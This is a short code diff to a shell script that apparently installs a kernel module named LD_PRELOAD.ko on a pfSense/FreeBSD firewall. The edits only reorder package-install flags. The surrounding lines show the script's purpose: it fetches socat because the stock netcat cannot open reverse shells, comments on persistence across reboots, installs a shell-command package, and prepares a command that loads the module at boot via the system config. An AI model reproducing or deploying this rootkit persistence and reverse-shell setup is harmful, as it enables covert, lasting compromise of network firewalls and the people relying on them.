@@ -17,7 +17,7 @@ LKM_NAME="LD_PRELOAD.ko"
 cp "$LKM_NAME" /boot/modules/
 # the version of nc (netcat) that comes with pfSense/FreeBSD doesn't allow for reverse shells
 # therefore we get socat
-pkg install socat -y
+pkg install -y socat
 
 # achieve persistance by loading the module everytime the system boots
 # cp ldpreload /usr/local/etc/rc.d/
@@ -25,7 +25,7 @@ pkg install socat -y
 
 # service ldpreload start
 
-pkg install pfSense-pkg-shellcmd -y
+pkg install -y pfSense-pkg-shellcmd
 
 CONFIG_FILE="/conf/config.xml"
 MODULE_CMD="/bin/sh -c '/sbin/kldload /boot/modules/LD_PRELOAD.ko'"
